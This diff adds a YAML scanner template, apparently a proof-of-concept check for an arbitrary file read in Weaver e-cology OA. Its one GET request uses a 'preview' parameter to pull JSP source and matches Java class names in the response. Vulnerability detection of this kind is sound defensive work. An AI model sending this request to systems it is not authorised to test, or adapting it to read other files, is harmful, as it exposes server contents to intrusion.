@@ -1,0 +1,20 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157
+binding: d3e5f065-b20e-4043-9fd4-b69498604e76
+detail:
+    author: system_user
+    links:
+        - http://124.223.89.192/archives/e-cology8-14
+    vulnerability:
+        id: aed7a0f7-f722-460b-bc6d-5ad4f9f1fe71
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.body.bcontains(b"weaver.general.BaseBean") && response.body.bcontains(b"getServletConfig")
+expression: r0()
